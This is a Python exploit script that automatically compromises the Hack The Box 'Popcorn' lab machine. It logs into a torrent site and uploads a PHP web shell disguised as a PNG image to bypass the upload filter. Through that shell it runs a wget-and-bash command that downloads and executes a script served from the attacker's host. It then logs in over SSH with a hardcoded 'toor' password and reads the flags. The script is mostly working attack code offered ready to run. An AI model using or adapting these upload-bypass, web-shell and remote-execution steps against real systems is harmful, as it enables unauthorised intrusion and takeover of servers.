import requests 
import time
import sys
import random
import urllib.parse
import re
import subprocess
import http.server
import socketserver
import threading
from bs4 import BeautifulSoup


Palette = {
    'red': '\033[31m',
    'green': '\033[32m',
    'yellow': '\033[33m',
    'blue': '\033[34m',
    'purple': '\033[35m',
    'cyan': '\033[36m',
    'grey': '\033[37m',
    'reset': '\033[0m'
}

def banner():
    print( Palette["green"] + """
 _   _ _____ ____  ____                                  
| | | |_   _| __ )|  _ \ ___  _ __   ___ ___  _ __ _ __  
| |_| | | | |  _ \| |_) / _ \| '_ \ / __/ _ \| '__| '_ \ 
|  _  | | | | |_) |  __/ (_) | |_) | (_| (_) | |  | | | |
|_| |_| |_| |____/|_|   \___/| .__/ \___\___/|_|  |_| |_|
                             |_|                         
             _                            
  __ _ _   _| |_ ___  _ ____      ___ __  
 / _` | | | | __/ _ \| '_ \ \ /\ / / '_ \ 
| (_| | |_| | || (_) | |_) \ V  V /| | | |
 \__,_|\__,_|\__\___/| .__/ \_/\_/ |_| |_| by Void4m0n
                     |_| 
          """ + Palette["reset"])


def final_banner():
    print(Palette['purple'] + "[*] Exploit complete! Maybe a respect ;)?\n[*] HTB PROFILE --> https://app.hackthebox.com/profile/1104062\n" + Palette['reset'])  

def exit():
    print("\n" + Palette["red"] + "[X] Closing Script..." + Palette["reset"])
    sys.exit()

def user_input():
    try:
        ip = sys.argv[1]
    except Exception as e:    
        print(Palette["red"] + "[X] Usage error")
        print("\n" + Palette["yellow"] + "[?] Correct usage:" + Palette["purple"] + " python3 Popcorn_autopwn.py [LHOST]")
        exit()
    return ip
    

def waiting_animation():
    for i in range(3):
        print(Palette['yellow'] + ".", end='',flush=True)
        time.sleep(0.7)
    print(Palette['reset'] + "\n")
    return



def try_conex(url): 
    print(Palette['yellow'] + "[*] Checking status of Popcorn" + Palette['reset'], end='') 
    waiting_animation()
    for i in range(10):
        try:
            r = requests.head(url, timeout=5)
            break
        except requests.exceptions.RequestException as e:
            i += 1 
            if i == 1:
                print(Palette['purple'] + f"[!] Popcorn seems to be down, the script will try 10 times to connect Popcorn\n[?] CHECK URL --> {url}\n")
            try_msg = Palette['purple'] + "--> "+ str(i) + " TRY\n"
            e = Palette['red'] + "[!] POPCORN DOWN! " + try_msg + Palette['reset']
            print(e)
            time.sleep(15)
            if i == 10:   
                exit()
        
    print(Palette['green'] + "[+] POPCORN UP!" + Palette['reset'])


# The hash assigned to the torrent files is calculated from the lengthi value, 
# this function modifies the value to avoid duplicate file upload erros errors
def random_hash():
    
    print(Palette['yellow'] + "\n[*] Modifying torrent file" + Palette['reset'], end="")
    waiting_animation()

    try:
        with open('utils/Payload.txt.torrent', 'rb+') as old_torrent_file:
            data = old_torrent_file.read()
            delimiter = " lengthi"
            delimiter_bytes = bytes(delimiter, 'UTF-8')        
            position = data.find(delimiter_bytes)            
            random_number = random.randint(10000,99999)
            old_torrent_file.seek(position+8) 
            old_torrent_file.write(bytes(str(random_number), 'UTF-8'))
    except Exception as e:
        print(Palette['red'] + "[X] Exception: " + str(e) + Palette['reset'])
        exit()


def RCE(s, url, hash_id, ip):
    RCE_url_encoded = urllib.parse.quote_plus(f"wget http://{ip}:8000/utils/PAM_MOD.sh && bash ./PAM_MOD.sh")
    url_web_shell = url + f"torrent/upload/{hash_id}.php?cmd=" + RCE_url_encoded

    PORT = 8000
    http_server = http.server.SimpleHTTPRequestHandler
    
    
    print('\n' + Palette['yellow'] + "[*] Initializing server" + Palette['reset'], end="")
    waiting_animation()

    
    print(Palette['green'] + "[+] Request: ", sep="")
    print("\r")   
    def start_server():
        httpd = socketserver.TCPServer((ip, PORT), http_server)
        httpd.handle_request()


    try: 
        server_thread = threading.Thread(target=start_server)
        server_thread.start()
    except Exception as e:
        print(str(e))
        exit()

    rce_request = s.get(url_web_shell, timeout=3)    
    
    server_thread.join()
    
def upload_webshell(s, url, hash_id, ip):
     
    url_upload_image = url + f"/torrent/upload_file.php?mode=upload&id={hash_id}"
    
    print('\n' + Palette['yellow'] + "[*] Adjusting web shell data" + Palette['reset'], end="")
    waiting_animation()
    try:        
         web_shell_file = {
            'file': ('shell.png.php', open('utils/shell.png.php','rb'), 'image/jpeg'),
            'submit' : (None, 'Submit Screenshot')
            } 
    except Exception as e:
        print(Palette['red'] + "Exception: " + str(e) + Palette['reset']) 
        exit()
    
    print(Palette['green'] + "[+] File upload Bypass measures" + Palette['reset'])

    print('\n' + Palette['yellow'] + "[*] Uploading web shell", end="")
    waiting_animation()
    try:
        web_shell_request = s.post(url_upload_image, files=web_shell_file) 
    except Exception as e:
        print(str(e))

    print(Palette['green'] + "[+] Web shell uploaded" + Palette['reset'])

    RCE(s, url, hash_id, ip)    
     

def upload_torrent(s, url, ip):
    upload_url = url + "/torrent/torrents.php?mode=upload"
    print('\n' + Palette['yellow'] + "[*] Preparing torrent upload" + Palette['reset'], end="")
    waiting_animation()
    try: 
        files = {
             'torrent': ('Payload.torrent', open('utils/Payload.txt.torrent','rb'), 'application/x-bittorrent'),
             'type' : (None, '3')
        }
    except Exception as e:
        
        print('\n' + Palette['red'] + "[X] Exception: " + str(e) + Palette['reset'])

        exit()
    

    print(Palette['green'] + "[+] Data prepared" + Palette['reset'])
    print('\n' + Palette['yellow'] + "[*] Uploading torrent file" + Palette['reset'], end="")
    waiting_animation() 

    try:
        upload_request = s.post(upload_url, files=files) 
    except Exception as e:
        
        print('\n' + Palette['red'] + "[X] Exception: " + str(e) + Palette['reset'])
        exit()    

    if "file upload succes" in upload_request.text:
        print(Palette['green'] + "[+] ¡Torrent file upload!" + Palette['reset'])
    else: 
        print(Palette['red'] + "[X] Torrent file upload fails" + Palette['reset'], end="")
        exit()
   
    print('\n' + Palette['yellow'] + "[*] Extracting file hash" + Palette['reset'], end="")
    waiting_animation()
    try:
        soup = BeautifulSoup(upload_request.text,  'html.parser')
        hash_id_tag = soup.find_all("meta", {"http-equiv" : "Refresh"})
        hash_id_tag_content = hash_id_tag[0].get("content")
        match = re.search(r'id=([\w-]+)', hash_id_tag_content)
        hash_id = match.group(1)
    except Exception as e:
        print(e)
        exit()

    print(Palette['green']  + f"[+] Torrent hash extracted: {hash_id}" + Palette['reset'])
    upload_webshell(s, url, hash_id, ip)

def login(url, ip):
    url_register = url + "torrent/users/index.php?mode=register" 
    url_login = url + "torrent/login.php"
    print(Palette['purple'] + f"[!] This page uses capchat, I can't register!!! :(,\n\n    [?] Please register at --> {url_register}" + Palette["reset"])
    username = input(Palette['green'] + "\n    [+] Your Username: " + Palette['reset'])
    password = input(Palette['green'] + "\n    [+] Your Password: " + Palette['reset'])
    s = requests.Session()
    data = {
        'username' : username,
        'password' : password
    }
    login = s.post(url_login, data=data) 
    test_login = s.get("http://10.10.10.6/torrent/users/index.php?mode=changepassword")
    if "newpassword2" not in test_login.text:
        print(Palette["red"] + f"\n    [X] Login fails, make sure that your credentials are correct " + Palette["green"] + f"{username} {password}" + Palette["reset"])
        exit()
    else:
        pass
    print('\n' + Palette['green'] + f"    [+] Login as {username} successfully" + Palette['reset'])
    upload_torrent(s, url, ip)


def get_flags():

    print('\n' + Palette["yellow"] + "[*] Extracting USER flag" + Palette['reset'], end="")
    waiting_animation() 
    try: 
        user_flag = subprocess.run("sshpass -p toor ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-dss toor@10.10.10.6 'cat /home/george/user.txt'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)   
    except subprocess.CalledProcessError as e:
            error = Palette['purple']  + e.stderr.decode().strip()
            print(Palette['red'] + "[!] Fail connecting with sshpass, bash error: " + error)
            exit()
    

    user_txt = user_flag.stdout.decode()
    print(Palette['green'] + "[+] USER flag: " + user_txt + Palette['reset'])

    print(Palette["yellow"] + "[*] Extracting ROOT flag" + Palette['reset'], end="")
    waiting_animation()
    try: 
        root_flag = subprocess.run("sshpass -p toor ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-dss toor@10.10.10.6 'cat /root/root.txt'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError as e:
            error = Palette['purple']  + e.stderr.decode().strip()
            print(Palette['red'] + "[!] Fail connecting with sshpass, bash error: " + error)
            exit()


    root_txt = root_flag.stdout.decode()
    print(Palette['green'] + "[+] ROOT flag: " + root_txt + Palette['reset'])




if __name__ == '__main__':
    url = "http://10.10.10.6:80/"
    banner()
    ip = user_input()
    try_conex(url)     
    random_hash()
    login(url, ip)
    get_flags()
    final_banner()
